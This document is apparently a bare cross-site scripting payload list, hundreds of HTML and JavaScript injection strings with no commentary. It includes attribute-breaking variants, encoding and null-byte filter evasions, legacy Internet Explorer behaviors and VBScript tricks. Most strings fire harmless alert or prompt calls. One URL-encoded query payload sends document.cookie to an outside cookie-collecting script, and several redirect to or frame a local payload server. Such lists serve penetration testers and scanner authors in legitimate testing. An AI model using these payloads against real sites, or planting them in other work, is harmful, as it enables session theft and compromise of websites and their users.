<?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if> </template> </stylesheet>
"><?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if> </template> </stylesheet>
'><?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if> </template> </stylesheet>
<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">
"><!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">
'><!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">
X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#X></vmlframe>
<xml> <rect style="height:100%;width:100%" id="X" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>
"><xml> <rect style="height:100%;width:100%" id="X" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>
'><xml> <rect style="height:100%;width:100%" id="X" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
'><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
<x style="behavior:url(test.sct)">
"><x style="behavior:url(test.sct)">
'><x style="behavior:url(test.sct)">
<SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>
"><SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>
'><SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>
<xml id="X" src="test.htc"></xml><label dataformatas="html" datasrc="#X" datafld="payload"></label>
"><xml id="X" src="test.htc"></xml><label dataformatas="html" datasrc="#X" datafld="payload"></label>
'><xml id="X" src="test.htc"></xml><label dataformatas="html" datasrc="#X" datafld="payload"></label>
<?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>
"><?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>
'><?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>
<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
"><?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
'><?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
class X {public static function main() { flash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"javascript:alert(1)"),flash.Lib._root.name||"_top"); }}
<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
"><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
'><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
"><body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
'><body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
X<form id=test onforminput=javascript:alert(1)><input></form>
X<form id=test><input></form><button form=test onformchange==javascript:alert(1)>X
<input onblur=write(1) autofocus><input autofocus>
"><input onblur=write(1) autofocus><input autofocus>
'><input onblur=write(1) autofocus><input autofocus>
<video onerror="javascript:alert(1)"><source>
"><video onerror="javascript:alert(1)"><source>
'><video onerror="javascript:alert(1)"><source>
<q/oncut=open()>
"><q/oncut=open()>
'><q/oncut=open()>
<marquee<marquee/onstart=confirm(1)>
"><marquee/onstart=confirm(1)>
'><marquee/onstart=confirm(1)>/onstart=confirm(1)>
<body language=vbsonload=alert-1
"><body language=vbsonload=alert-1
'><body language=vbsonload=alert-1
<command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B">Save</command> 
"><command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B">Save</command> 
'><command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B">Save</command> 
<q/oncut=alert(1)>
"><q/oncut=alert(1)>
'><q/oncut=alert(1)>
eval("aler"+(!![]+[])[+[]])("X")
window["alert"]("X")
this['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()
< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \x3c \x3C \u003c \u003C
">< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \x3c \x3C \u003c \u003C
'>< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \x3c \x3C \u003c \u003C
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">X</A>
"><A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">X</A>
'><A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">X</A>
<A HREF="http://1113982867/">X</A>
"><A HREF="http://1113982867/">X</A>
'><A HREF="http://1113982867/">X</A>
<A HREF="h tt	p://6&#09;6.000146.0x7.147/">X</A>
"><A HREF="h tt	p://6&#09;6.000146.0x7.147/">X</A>
'><A HREF="h tt	p://6&#09;6.000146.0x7.147/">X</A>
<A HREF="//google">X</A>
"><A HREF="//google">X</A>
'><A HREF="//google">X</A>
<A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html@google">X</A
"><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html@google">X</A
'><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html@google">X</A
<A HREF="http://google:127.0.0.1:3555/xss_serve_payloads/X.html">X</A>
"><A HREF="http://google:127.0.0.1:3555/xss_serve_payloads/X.html">X</A>
'><A HREF="http://google:127.0.0.1:3555/xss_serve_payloads/X.html">X</A>
document.write('<iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" style="border: 0; width: 100%; height: 100%"></iframe>')
http://%22%20onerror=%22alert%281%29;//
document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'
document.location="http://127.0.0.1:3555/xss_serve_payloads/X.html"
\"><script>alert(/X/)<script>
;alert%28String.fromCharCode%2875,67,70%29%29//\%27;alert%28String.fromCharCode%2875,67,70%29%29//%22;alert%28String.fromCharCode%2875,67,70%29%29//\%22;alert%28String.fromCharCode%2875,67,70%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2875,67,70%29%29%3C/SCRIPT%3E
<input onfocus=write(1) autofocus>
"><input onfocus=write(1) autofocus>
'><input onfocus=write(1) autofocus>
<video poster=javascript:alert(1)//></video>
"><video poster=javascript:alert(1)//></video>
'><video poster=javascript:alert(1)//></video>
<video poster=prompt(1)//></video>
"><video poster=prompt(1)//></video>
'><video poster=prompt(1)//></video>
<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
"><body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
'><body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<body onscroll=prompt(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
"><body onscroll=prompt(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
'><body onscroll=prompt(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>
"><form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>
'><form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>
<video><source onerror="alert(1)">
"><video><source onerror="alert(1)">
'><video><source onerror="alert(1)">
<video><source onerror="prompt(1)">
"><video><source onerror="prompt(1)">
'><video><source onerror="prompt(1)">
<video><source onerror="prompt(1)">
"><video><source onerror="prompt(1)">
'><video><source onerror="prompt(1)"></source></video>
"><video><source onerror="prompt(1)"></source></video>
'><video><source onerror="prompt(1)"></source></video>
<form><button formaction="javascript:alert(1)">X</button>
"><form><button formaction="javascript:alert(1)">X</button>
'><form><button formaction="javascript:alert(1)">X</button>
<body oninput=alert(1)><input autofocus>
"><body oninput=alert(1)><input autofocus>
'><body oninput=alert(1)><input autofocus>
<body oninput=prompt(1)><input autofocus>
"><body oninput=prompt(1)><input autofocus>
'><body oninput=prompt(1)><input autofocus>
<frameset onload=prompt(1)>
"><frameset onload=prompt(1)>
'><frameset onload=prompt(1)>
<comment><img src="</comment><img src=x onerror=alert(1)//">
"><comment><img src="</comment><img src=x onerror=alert(1)//">
'><comment><img src="</comment><img src=x onerror=alert(1)//">
<comment><img src="</comment><img src=x onerror=prompt(1)//">
"><comment><img src="</comment><img src=x onerror=prompt(1)//">
'><comment><img src="</comment><img src=x onerror=prompt(1)//">
<style><img src="</style><img src=x onerror=prompt(1)//">
"><style><img src="</style><img src=x onerror=prompt(1)//">
'><style><img src="</style><img src=x onerror=prompt(1)//">
<SCRIPT FOR=document EVENT=onreadystatechange>prompt(1)</SCRIPT>
"><SCRIPT FOR=document EVENT=onreadystatechange>prompt(1)</SCRIPT>
'><SCRIPT FOR=document EVENT=onreadystatechange>prompt(1)</SCRIPT>
<div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>
"><div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>
'><div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>
<img[a][b]src=x[d]onerror[c]=[e]"prompt(1)">
"><img[a][b]src=x[d]onerror[c]=[e]"prompt(1)">
'><img[a][b]src=x[d]onerror[c]=[e]"prompt(1)">
'-prompt(1)'
'-alert(1)-'
';alert(String.fromCharCode(75,67,70))//';alert(String.fromCharCode(75,67,70))//";
alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
<IMG SRC=# onmouseover="alert('X')">
"><IMG SRC=# onmouseover="alert('X')">
'><IMG SRC=# onmouseover="alert('X')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
"><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
'><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC="jav&#x0A;ascript:alert('X');">
"><IMG SRC="jav&#x0A;ascript:alert('X');">
'><IMG SRC="jav&#x0A;ascript:alert('X');">
exp/*<A STYLE='no\X:noX("*//*");X:ex/*X*//*/*/pression(alert("X"))'>
'"--></style></script><script>alert("X")</script>
'"--></style></script><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
"></script><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
'></script><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
&'"><script>alert(/X/)</script>
"><script>alert(/X/)</script>
'><script>alert(/X/)</script>
%26'%22%3E%3Cscript%3Ealert(%2FX%2F)%3C%2Fscript%3E%3D
&'">PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4
&'">/'-C<FEP=#YA;&5R="@O>'-S+RD\+W-C<FEP=#.
&'">\u{3c}\u{73}\u{63}\u{72}\u{69}\u{70}\u{74}\u{3e}\u{61}\u{6c}\u{65}\u{72}\u{74}\u{28}\u{2f}\u{78}\u{73}\u{73}\u{2f}\u{29}\u{3c}\u{2f}\u{73}\u{63}\u{72}\u{69}\u{70}\u{74}\u{3e}
&'">\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u002f\u0078\u0073\u0073\u002f\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e
&'">0x3c7363726970743e616c657274282f7873732f293c2f7363726970743e
&'">-1,54,38,53,44,51,55,-1,36,47,40,53,55,-1,-1,59,54,54,-1,-1,-1,-1,54,38,53,44,51,55,-1
&'">PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
&'">3e7470697263732f3c292f7373782f287472656c613e7470697263733c
&'">chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62).chr(97).chr(108).chr(101).chr(114).chr(116).chr(40).chr(47).chr(120).chr(115).chr(115).chr(47).chr(41).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62)
&'">TypeError: Cannot read property '$content$' of undefined
&'">\74\163\143\162\151\160\164\76\141\154\145\162\164\50\57\170\163\163\57\51\74\57\163\143\162\151\160\164\76
&'"><script>alert(/X/)</āăą>
&'">%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u002f%u0078%u0073%u0073%u002f%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e
&'">\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff0f\uff58\uff53\uff53\uff0f\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e
&'">&lt;script&gt;alert&lpar;&sol;X&sol;&rpar;&lt;&sol;script&gt;
&'">&lt;script&gt;alert(/X/)&lt;/script&gt;
&'">Description:Syntax error Msg:Unexpected token < )
</script><svg onload='-/"/-alert(1)//'>
"></script><svg onload='-/"/-alert(1)//'>
'></script><svg onload='-/"/-alert(1)//'>
<!-- --!><script>alert(X)</script>-->
"><!-- --!><script>alert(X)</script>-->
'><!-- --!><script>alert(X)</script>-->
<![CDATA[<script>alert(X)</script>]]>
"><![CDATA[<script>alert(X)</script>]]>
'><![CDATA[<script>alert(X)</script>]]>
[data "1<div style=width:expression(prompt(1))>"]
+onerror=alert(1)%3E/
+onerror=prompt(1)%3E/
?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63% 75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
?#?gad=xxxx"onload="alert(1)"
#?gad=xxxx"onload="alert(1)"
/#?gad=xxxx"onload="alert(1)"
“><script >alert(1)</script >
“><ScRiPt>alert(1)</ScRiPt>
“%3e%3cscript%3ealert(1)%3c/script%3e
“><scr<script>ipt>alert(1)</scr</script>ipt>
"><scr<script>ipt>alert(1)</scr</script>ipt>
'><scr<script>ipt>alert(1)</scr</script>ipt>
%00“><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<xml onreadystatechange=alert(1)>
"><xml onreadystatechange=alert(1)>
'><xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
"><style onreadystatechange=alert(1)>
'><style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
"><iframe onreadystatechange=alert(1)>
'><iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
"><object onerror=alert(1)>
'><object onerror=alert(1)>
<object type=image src=X.gif onreadystatechange=alert(1)></object>
"><object type=image src=X.gif onreadystatechange=alert(1)></object>
'><object type=image src=X.gif onreadystatechange=alert(1)></object>
<img type=image src=X.gif onreadystatechange=alert(1)>
"><img type=image src=X.gif onreadystatechange=alert(1)>
'><img type=image src=X.gif onreadystatechange=alert(1)>
<input type=image src=X.gif onreadystatechange=alert(1)>
"><input type=image src=X.gif onreadystatechange=alert(1)>
'><input type=image src=X.gif onreadystatechange=alert(1)>
<isindex type=image src=X.gif onreadystatechange=alert(1)>
"><isindex type=image src=X.gif onreadystatechange=alert(1)>
'><isindex type=image src=X.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
"><script onreadystatechange=alert(1)>
'><script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
"><bgsound onpropertychange=alert(1)>
'><bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
"><body onbeforeactivate=alert(1)>
'><body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
"><body onactivate=alert(1)>
'><body onactivate=alert(1)>
<body onfocusin=alert(1)>
"><body onfocusin=alert(1)>
'><body onfocusin=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
"><input onblur=alert(1) autofocus><input autofocus>
'><input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
"><body onscroll=alert(1)><br><br>...<br><input autofocus>
'><body onscroll=alert(1)><br><br>...<br><input autofocus>
</a onmousemove=alert(1)>
"></a onmousemove=alert(1)>
'></a onmousemove=alert(1)>
<video src=1 onerror=alert(1)>
"><video src=1 onerror=alert(1)>
'><video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
"><audio src=1 onerror=alert(1)>
'><audio src=1 onerror=alert(1)>
<object data=javascript:alert(1)>
"><object data=javascript:alert(1)>
'><object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
"><iframe src=javascript:alert(1)>
'><iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
"><embed src=javascript:alert(1)>
'><embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
"><form id=test /><button form=test formaction=javascript:alert(1)>
'><form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
"><event-source src=javascript:alert(1)>
'><event-source src=javascript:alert(1)>
<x style=x:expression(alert(1))>
"><x style=x:expression(alert(1))>
'><x style=x:expression(alert(1))>
<x style=behavior:url(#default#time2) onbegin=alert(1)>
"><x style=behavior:url(#default#time2) onbegin=alert(1)>
'><x style=behavior:url(#default#time2) onbegin=alert(1)>
<iMg onerror=alert(1) src=a>
"><iMg onerror=alert(1) src=a>
'><iMg onerror=alert(1) src=a>
<[%00]img onerror=alert(1) src=a>
"><[%00]img onerror=alert(1) src=a>
'><[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
"><i[%00]mg onerror=alert(1) src=a>
'><i[%00]mg onerror=alert(1) src=a>
<img/onerror=alert(1) src=a>
"><img/onerror=alert(1) src=a>
'><img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
"><img[%09]onerror=alert(1) src=a>
'><img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
"><img[%0d]onerror=alert(1) src=a>
'><img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
"><img[%0a]onerror=alert(1) src=a>
'><img[%0a]onerror=alert(1) src=a>
<img/”onerror=alert(1) src=a>
"><img/”onerror=alert(1) src=a>
'><img/”onerror=alert(1) src=a>
<img/’onerror=alert(1) src=a>
"><img/’onerror=alert(1) src=a>
'><img/’onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
"><img/anyjunk/onerror=alert(1) src=a>
'><img/anyjunk/onerror=alert(1) src=a>
<img o[%00]nerror=alert(1) src=a>
"><img o[%00]nerror=alert(1) src=a>
'><img o[%00]nerror=alert(1) src=a>
<i[%00]m[%00]g o[%00]ner[%00]r[%00]or[%00]=a[%00]ler[%00]t(1) sr[%00]c=[%00]a>
"><i[%00]m[%00]g o[%00]ner[%00]r[%00]or[%00]=a[%00]ler[%00]t(1) sr[%00]c=[%00]a>
'><i[%00]m[%00]g o[%00]ner[%00]r[%00]or[%00]=a[%00]ler[%00]t(1) sr[%00]c=[%00]a>
<img onerror=”alert(1)”src=a>
"><img onerror=”alert(1)”src=a>
'><img onerror=”alert(1)”src=a>
<img onerror=’alert(1)’src=a>
"><img onerror=’alert(1)’src=a>
'><img onerror=’alert(1)’src=a>
<img onerror=`alert(1)`src=a>
"><img onerror=`alert(1)`src=a>
'><img onerror=`alert(1)`src=a>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
"><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
'><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
<img onerror=a&#x06c;ert(1) src=a>
"><img onerror=a&#x06c;ert(1) src=a>
'><img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
"><img onerror=a&#x006c;ert(1) src=a>
'><img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
"><img onerror=a&#x0006c;ert(1) src=a>
'><img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
"><img onerror=a&#108;ert(1) src=a>
'><img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
"><img onerror=a&#0108;ert(1) src=a>
'><img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
"><img onerror=a&#108ert(1) src=a>
'><img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
"><img onerror=a&#0108ert(1) src=a>
'><img onerror=a&#0108ert(1) src=a>
%253cimg%20onerror=alert(1)%20src=a%253e
%3cimg onerror=alert(1) src=a%3e
<img onerror=alert(1) src=a>
"><img onerror=alert(1) src=a>
'><img onerror=alert(1) src=a>
«img onerror=alert(1) src=a»
<script>a\u006cert(1);</script>
"><script>a\u006cert(1);</script>
'><script>a\u006cert(1);</script>
<script>eval(‘a\u006cert(1)’);</script>
"><script>eval(‘a\u006cert(1)’);</script>
'><script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
"><script>eval(‘a\x6cert(1)’);</script>
'><script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>
"><script>eval(‘a\154ert(1)’);</script>
'><script>eval(‘a\154ert(1)’);</script>
<script>eval(‘a\l\ert\(1\)’);</script>
"><script>eval(‘a\l\ert\(1\)’);</script>
'><script>eval(‘a\l\ert\(1\)’);</script>
<script>eval(‘al’+’ert(1)’);</script>
"><script>eval(‘al’+’ert(1)’);</script>
'><script>eval(‘al’+’ert(1)’);</script>
<script>eval(String.fromCharCode(75,67,70));</script>
"><script>eval(String.fromCharCode(75,67,70));</script>
'><script>eval(String.fromCharCode(75,67,70));</script>
<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
"><script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
'><script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
<script>’alert(1)’.replace(/.+/,eval)</script>
"><script>’alert(1)’.replace(/.+/,eval)</script>
'><script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>
"><script>function::[‘alert’](1)</script>
'><script>function::[‘alert’](1)</script>
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
"><img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
'><img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
<script language=vbs>MsgBox 1</script>
"><script language=vbs>MsgBox 1</script>
'><script language=vbs>MsgBox 1</script>
<img onerror=”vbs:MsgBox 1” src=a>
"><img onerror=”vbs:MsgBox 1” src=a>
'><img onerror=”vbs:MsgBox 1” src=a>
<img onerror=MsgBox+1 language=vbs src=a>
"><img onerror=MsgBox+1 language=vbs src=a>
'><img onerror=MsgBox+1 language=vbs src=a>
<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
"><SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
'><SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
<IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
"><IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
'><IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
<script>execScript(“MsgBox 1”,”vbscript”);</script>
"><script>execScript(“MsgBox 1”,”vbscript”);</script>
'><script>execScript(“MsgBox 1”,”vbscript”);</script>
<script language=vbs>execScript(“alert(1)”)</script>
"><script language=vbs>execScript(“alert(1)”)</script>
'><script language=vbs>execScript(“alert(1)”)</script>
<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
